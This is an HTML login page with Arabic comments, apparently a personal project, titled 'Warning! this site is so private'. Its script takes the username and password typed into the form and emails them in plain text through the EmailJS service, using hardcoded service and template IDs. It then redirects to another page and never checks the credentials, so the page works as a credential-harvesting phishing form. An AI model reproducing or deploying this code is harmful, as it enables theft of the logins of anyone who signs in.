<!DOCTYPE html>       <!-- login.html -->
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- style files -->
    <link rel="stylesheet" href="style.css">
    <!-- google fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
   
    <title>Login</title>
    <!-- ارسال ايميل عند محاولة تسجيل الدخول -->
     <!-- emailjs.com -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("3o_Ok3aG0DS4-OWJo");  // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك من EmailJS
        })();

        function sendEmail(event) {
            event.preventDefault();
            var templateParams = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value
            };

            emailjs.send('service_jmd86we', 'template_ut83dfy', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    window.location.href = 'pass-page/pass.html';
                }, function(error) {
                    console.log('FAILED...', error);
                });
        }
    </script>
</head>
<body>
    <header>
        <div class="content-header">
            <h1>
                Warning ! <br> this site is so private
            </h1>
        </div>
    </header>
    <div class="container-home">
        <div class="container-form">

                <form onsubmit="sendEmail(event)" id="login-form">

                <h2>Sign in</h2>
                <br>
                <div class="username">
                     <label for="username" class="name">Name</label>
                     <input type="username" id="username" name="username" class="input-name-password">
                </div>
                <br>
                <div class="password">
                    <label for="password" class="passwordo">Key</label>
                    <input type="password" id="password" name="password" class="input-name-password">
                </div>
                <input type="submit" value="Submit" class="input-supmit">  <!-- زر "Submit" مخفي -->
                
                </form>

        </div>
    </div>
    <footer>
        <div class="content-header">
            <h3>
               Dev Talaat Gamal <|> 6 / 2024 <br> Designing & development
            </h3>
        </div>
    </footer>

</body>
</html>
